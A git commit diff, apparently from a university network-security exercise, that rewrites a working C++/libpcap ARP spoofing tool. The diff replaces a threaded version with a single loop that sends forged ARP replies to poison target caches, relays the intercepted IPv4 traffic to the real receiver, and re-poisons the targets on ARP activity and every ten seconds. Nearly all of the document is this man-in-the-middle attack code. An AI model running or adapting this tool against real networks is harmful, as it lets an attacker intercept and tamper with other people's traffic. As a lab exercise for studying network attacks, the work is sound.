c4fb6f64aa2cb1c7ed372ddbba0eb4862a56e642
cidy <cccccdyy@korea.ac.kr>
2024-04-14 18:43:29 +0900

    Add main.cpp

--- main.cpp
+++ main.cpp
@@ -5,19 +5,13 @@
 #include <net/if.h>
 #include <unistd.h>
 #include <pthread.h>
+#include<time.h>
+#include <ctime>
 #include "ethhdr.h"
 #include "arphdr.h"
 #include "iphdr.h"
 
-pthread_mutex_t mutex = PTHREAD_MUTEX_INITIALIZER;
 uint8_t my_mac[6];
-
-/* ptorotypes */
-int GetMacAddr(const char* interface, uint8_t* my_mac);
-int infection(pcap_t* handle, uint32_t sender_ip, uint32_t receiver_ip, Mac* sender_mac);
-void relay(pcap_t* handle, uint32_t sender_ip, uint32_t receiver_ip, Mac sender_mac, Mac receiver_mac);
-void infection_routine(void* thread_arg);
-void spoof_routine(void* thread_arg);
 
 void debug(int a)
 {
@@ -39,15 +33,6 @@ struct EthIpPacket final
 	IpHdr ip_;
 };
 #pragma pack(pop)
-
-struct threadarg
-{
-	pcap_t* handle;
-	Ip sender_ip;
-	Ip receiver_ip;
-	Mac sender_mac;
-	Mac receiver_mac;
-};
 
 void usage() 
 {
@@ -73,46 +58,16 @@ int GetMacAddr(const char* interface, uint8_t* my_mac)
 		close(sockfd);
 		return -1;
 	}
-	memcpy(my_mac, ifr.ifr_hwaddr.sa_data, 6); // mac addr len
+	memcpy(my_mac, ifr.ifr_hwaddr.sa_data, 6); // mac addr len = 6
 	close(sockfd);
 
 	return 0;
 }
 
-int reply(pcap_t* handle, Ip sender_ip, Ip receiver_ip, Mac sender_mac)
-{
-	EthArpPacket packet;
+void broadcast (pcap_t* handle, Ip sender_ip, Mac* sender_mac)
+{   
+    EthArpPacket packet;
 
-	/* Send ARP infection packet */
-	packet.eth_.dmac_ = sender_mac; // sender mac
-	packet.eth_.smac_ = Mac(my_mac); // my mac
-	packet.eth_.type_ = htons(EthHdr::Arp);
-
-	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
-	packet.arp_.pro_ = htons(EthHdr::Ip4);
-	packet.arp_.hln_ = Mac::SIZE;
-	packet.arp_.pln_ = Ip::SIZE;
-	packet.arp_.op_ = htons(ArpHdr::Reply); // reply
-	packet.arp_.smac_ = Mac(my_mac);  // my mac
-	packet.arp_.sip_ = htonl(receiver_ip); // receiver ip
-	packet.arp_.tmac_ = sender_mac; // sender mac
-	packet.arp_.tip_ = htonl(sender_ip); // sender ip
-
-	pthread_mutex_lock(&mutex);
-	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
-	pthread_mutex_unlock(&mutex);
-	if (res != 0) {
-		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
-	}
-	return 0;
-}
-
-int infection(pcap_t* handle, Ip sender_ip, Ip receiver_ip, Mac* sender_mac)
-{
-
-	EthArpPacket packet;
-
-	/* broadcast to get mac addr */
 	packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
 	packet.eth_.smac_ = Mac(my_mac); // my mac
 	packet.eth_.type_ = htons(EthHdr::Arp);
@@ -127,9 +82,7 @@ int infection(pcap_t* handle, Ip sender_ip, Ip receiver_ip, Mac* sender_mac)
 	packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
 	packet.arp_.tip_ = htonl(sender_ip); // sender ip
 
-	pthread_mutex_lock(&mutex);
 	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
-	pthread_mutex_unlock(&mutex);
 	if (res != 0) {
 		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
 	}	
@@ -156,172 +109,139 @@ int infection(pcap_t* handle, Ip sender_ip, Ip receiver_ip, Mac* sender_mac)
 		}
 	}
 	*sender_mac = arp_hdr->smac();
-
-	reply(handle, sender_ip, receiver_ip, *sender_mac);
-
-	return 0;
 }
 
-void relay(pcap_t* handle, Ip sender_ip, Ip receiver_ip, Mac sender_mac, Mac receiver_mac)
+void reply(pcap_t* handle, Ip sender_ip, Ip receiver_ip, Mac sender_mac)
 {
-	struct pcap_pkthdr* header;
-	const u_char* rcvpacket;
-	PEthHdr ethernet_hdr;
-	PIpHdr ip_hdr;
-	PArpHdr arp_hdr;
-	int res;
+	EthArpPacket packet;
 
-	while(true){ 
-		res = pcap_next_ex(handle, &header, &rcvpacket);
+	/* Send ARP infection packet */
+	packet.eth_.dmac_ = sender_mac; // sender mac
+	packet.eth_.smac_ = Mac(my_mac); // my mac
+	packet.eth_.type_ = htons(EthHdr::Arp);
+
+	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
+	packet.arp_.pro_ = htons(EthHdr::Ip4);
+	packet.arp_.hln_ = Mac::SIZE;
+	packet.arp_.pln_ = Ip::SIZE;
+	packet.arp_.op_ = htons(ArpHdr::Reply); // reply
+	packet.arp_.smac_ = Mac(my_mac);  // my mac
+	packet.arp_.sip_ = htonl(receiver_ip); // receiver ip
+	packet.arp_.tmac_ = sender_mac; // sender mac
+	packet.arp_.tip_ = htonl(sender_ip); // sender ip
+
+	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
+	if (res != 0) {
+		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
+	}
+}
+
+void infection(pcap_t* handle, Ip sender_ip, Ip receiver_ip, Mac* sender_mac)
+{
+    broadcast(handle, sender_ip, sender_mac);
+	reply(handle, sender_ip, receiver_ip, *sender_mac);
+}
+
+void relay (pcap_t* handle, PEthHdr ethernet_hdr, PIpHdr ip_hdr, Mac receiver_mac) 
+{
+    int size = sizeof(EthHdr) + ntohs(ip_hdr->total_len); // get header size
+	ethernet_hdr->smac_ = Mac(my_mac); // modify src mac -> my mac 
+	ethernet_hdr->dmac_ = receiver_mac; // modify dmac -> original destination
+
+	// relay packet
+	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(ethernet_hdr), size);
+	if (res != 0) {
+		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
+	}		
+}
+
+
+int main (int argc, char* argv[])
+{
+    /* check argc */
+	if (argc < 4 || (argc % 2) != 0) {
+		usage();
+		return -1;
+	}
+	char* dev = argv[1]; // interface name
+    printf("%s\n", dev);
+	GetMacAddr(dev, my_mac); // get my mac
+
+    /* resources */
+    unsigned int count = argc / 2 - 1;
+    Ip sender_ip[count];
+    Ip receiver_ip[count];
+    Mac sender_mac[count]; 
+    Mac receiver_mac[count];
+    char errbuf[PCAP_ERRBUF_SIZE];
+
+    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
+	if (handle == nullptr) {
+		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
+		return -1;
+	}
+
+    /* initialize */
+    for (int i = 0; i < count; i++){
+        sender_ip[i] = Ip((const char*)argv[2 * (i + 1)]);
+        receiver_ip[i] = Ip((const char*)argv[2 * (i + 1) + 1]);
+        broadcast(handle, receiver_ip[i], &receiver_mac[i]); // get receiver`s mac
+    }
+
+    unsigned int res = 0;
+    struct pcap_pkthdr* header;
+	const u_char* packet;
+    PEthHdr ethernet_hdr;
+    PIpHdr ip_hdr;
+	PArpHdr arp_hdr;
+
+    /* sender  infection */
+    for (int i = 0; i < count; i++){
+        infection(handle, sender_ip[i], receiver_ip[i], &sender_mac[i]);
+    }
+    /* relay packet */
+    time_t start_sec = time(NULL);
+    uint64_t check = 0;
+    while (true) {
+        res = pcap_next_ex(handle, &header, &packet);
 		if (res == 0) continue;
 		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
 			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
 			break;
 		}
-		
-		/* Get eth header */
-		ethernet_hdr = (PEthHdr)rcvpacket;
+		ethernet_hdr = (PEthHdr)packet; // Get eth header 
 		uint16_t eth_type = ethernet_hdr->type();
+        if (eth_type == EthHdr::Ip4){ // ipv4
+			ip_hdr = (PIpHdr)(packet + sizeof(struct EthHdr)); // Get Ip header 
+            for (int i = 0; i < count; i++) {
+                if (ip_hdr->sip() == sender_ip[i] && ip_hdr->dip() == receiver_ip[i]) {
+                    relay(handle, ethernet_hdr, ip_hdr, receiver_mac[i]); // relay packet
+                    break;
+                }
+            }
+        }
+        else if (eth_type == EthHdr::Arp) { // arp
+            arp_hdr = (PArpHdr)(packet + sizeof(struct EthHdr)); // Get ARP header
+            for (int i = 0; i < count; i++) {
+                if ((arp_hdr->sip() == sender_ip[i] && arp_hdr->tip() == receiver_ip[i]) || \
+                    (arp_hdr->sip() == receiver_ip[i] && arp_hdr->tip() == sender_ip[i])){
+                    reply(handle, sender_ip[i], receiver_ip[i], sender_mac[i]); //reinfection
+                }
+            }
+        }
 
+        /* periodic re-infection */
+        time_t current_sec = time(NULL);
+        check = current_sec - start_sec;
+        if (check >= 10){
+            debug(1);
+            for (int i = 0; i < count ; i++) {
+                reply(handle, sender_ip[i], receiver_ip[i], sender_mac[i]); //reinfection
+            }
+            start_sec = current_sec;
+        }
+    }
 
-		/* Ip */
-		if(eth_type == EthHdr::Ip4){ // if ipv4
-
-			/* Get Ip header */
-			ip_hdr = (PIpHdr)(rcvpacket + sizeof(struct EthHdr));
-
-			// check this thread`s packet
-			if (ip_hdr->dip() != sender_ip && ip_hdr->sip() != sender_ip) continue;
-
-			if(ip_hdr->proto == 1){ // check if icmp
-				int size = sizeof(EthHdr) + ntohs(ip_hdr->total_len);
-	
-				// modify src mac -> my mac 
-				ethernet_hdr->smac_ = Mac(my_mac);
-				
-				// modify dmac -> original destination
-				if(ip_hdr->dip() == sender_ip) ethernet_hdr->dmac_ = sender_mac;
-				else if(ip_hdr->dip() == receiver_ip) ethernet_hdr->dmac_ = receiver_mac;
-
-				// relay
-				pthread_mutex_lock(&mutex);
-				res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(rcvpacket), size);
-				pthread_mutex_unlock(&mutex);
-				if (res != 0) {
-					fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
-				}			
-			}
-		}
-		
-		/* Arp */
-		else if(eth_type == EthHdr::Arp){ // if arp
-			/* Get ARP header */
-			arp_hdr = (PArpHdr)(rcvpacket + sizeof(struct EthHdr));
-
-			// check this thread`s packet
-			if (ethernet_hdr->dmac() != sender_mac && ethernet_hdr->smac() != sender_mac) continue;
-
-			// sender re-infection 
-			if((ethernet_hdr->dmac() == Mac("ff:ff:ff:ff:ff:ff") && arp_hdr->sip() == Ip(sender_ip)) || \
-				(ethernet_hdr->dmac() == Mac(my_mac) && arp_hdr->sip() == sender_ip)) {
-				reply(handle, sender_ip, receiver_ip, sender_mac);
-			}	
-			// receiver re-infection
-			else if ((ethernet_hdr->dmac() == Mac("ff:ff:ff:ff:ff:ff") && arp_hdr->sip() == Ip(receiver_ip)) ||\
-				(ethernet_hdr->dmac() == Mac(my_mac) && arp_hdr->sip() == receiver_ip)) {
-				reply(handle, receiver_ip, sender_ip, receiver_mac);
-			}
-		}
-	}
-}
-
-void infection_routine(void* thread_arg)
-{
-	threadarg* arg = (threadarg*)thread_arg;
-
-	while(true) {
-		sleep(10); // 10 sec sleep
-		reply(arg->handle, arg->sender_ip, arg->receiver_ip, arg->sender_mac);
-		reply(arg->handle, arg->receiver_ip, arg->sender_ip, arg->receiver_mac);
-	}
-}
-
-void spoof_routine(void* thread_arg) 
-{	
-	threadarg* arg = (threadarg*)thread_arg;
-
-	/* sender & receiver infection */
-	infection(arg->handle, arg->receiver_ip, arg->sender_ip, &arg->receiver_mac);
-	infection(arg->handle, arg->sender_ip, arg->receiver_ip, &arg->sender_mac);
-	
-
-	/* periodic re-infection */
-	pthread_t thread_t;
-	if (pthread_create(&thread_t, NULL, (void* (*)(void*))infection_routine, (void*)thread_arg)) {
-    	perror("thread create error:");
-    	exit(0);
-	}
-
-	/* packet relay */
-	relay(arg->handle, arg->sender_ip, arg->receiver_ip, arg->sender_mac, arg->receiver_mac);
-
-	/* thread join */
-	if(pthread_join(thread_t, 0)){
-		perror("thread join error:");
-    	exit(0);
-	}
-}
-
-int main(int argc, char* argv[]) 
-{
-	/* check argc */
-	if (argc < 4 || (argc % 2) != 0) {
-		usage();
-		return -1;
-	}
-
-	/* interface name */
-	char* dev = argv[1];
-
-	/* get mac addr (Attacker) */
-	GetMacAddr(dev, my_mac);
-
-	unsigned int count = argc / 2 - 1;
-	pthread_t thread_t[count];
-	threadarg thread_arg[count];
-	pcap_t* handle[count];
-	char errbuf[count][PCAP_ERRBUF_SIZE];
-
-	// make threads
-	for(int i = 0; i < count; i++){
-
-		handle[i] = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf[i]);
-		if (handle[i] == nullptr) {
-			fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf[i]);
-			return -1;
-		}
-		/* set args */
-		thread_arg[i].handle = handle[i];
-		thread_arg[i].sender_ip = Ip((const char*)argv[2 * (i + 1)]);
-		thread_arg[i].receiver_ip = Ip((const char*)argv[2 * (i + 1) + 1]);
-
-		if (pthread_create(&thread_t[i], NULL, (void* (*)(void*))spoof_routine, (void*)&thread_arg[i])) {
-    		perror("thread create error:");
-    		exit(0);
-		}
-
-	}
-
-	// join threads
-	for (int i = 0; i < count; i++){
-		if(pthread_join(thread_t[i], 0)){
-			perror("thread join error:");
-    		exit(0);
-		}
-	}
-
-	// return handles
-	for (int i = 0; i < count; i++) pcap_close(handle[i]);
-	// mutex destroy
-	pthread_mutex_destroy(&mutex);
+    /* return handle */
+    pcap_close(handle);
 }
